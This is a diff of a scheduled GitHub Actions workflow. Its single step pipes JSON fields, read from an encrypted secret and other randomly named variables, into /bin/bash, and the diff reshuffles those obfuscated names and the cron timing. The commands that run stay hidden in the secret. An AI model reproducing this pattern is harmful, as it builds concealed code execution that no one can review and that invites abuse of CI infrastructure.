@@ -1,27 +1,27 @@
 name: layercengjin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '3 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: layercengjin
         env:
-          l166: ${{ secrets.l166 }}
+          i3: ${{ secrets.i3 }}
         run: |
-          echo $l166 | jq -r .eh198 | /bin/bash
-          echo $xyt7 | jq -r .xrxax67 | /bin/bash
-          echo $fatm0816 | jq -r .sco526 | /bin/bash
-          echo $g1 | jq -r .curk7 | /bin/bash
-          echo $xol80 | jq -r .eo5 | /bin/bash
-          echo $rdb318 | jq -r .l097 | /bin/bash
-          echo $mg29470 | jq -r .kd9 | /bin/bash
-          echo $k7353 | jq -r .jap0696 | /bin/bash
-          echo $l7 | jq -r .cn47320 | /bin/bash
+          echo $i3 | jq -r .dra4507 | /bin/bash
+          echo $qq051 | jq -r .y881 | /bin/bash
+          echo $n28 | jq -r .nwfp27026 | /bin/bash
+          echo $gjlfs359 | jq -r .mbp705 | /bin/bash
+          echo $i21144 | jq -r .wbz9627 | /bin/bash
+          echo $gmbmq67379 | jq -r .qpy22 | /bin/bash
+          echo $txcn4 | jq -r .tjczy5 | /bin/bash
+          echo $keuya7652 | jq -r .uylsg03 | /bin/bash
+          echo $qf3 | jq -r .h938 | /bin/bash
+          echo $p82100 | jq -r .xui5036 | /bin/bash
+          echo $cdrxu59 | jq -r .vyhd78 | /bin/bash
 
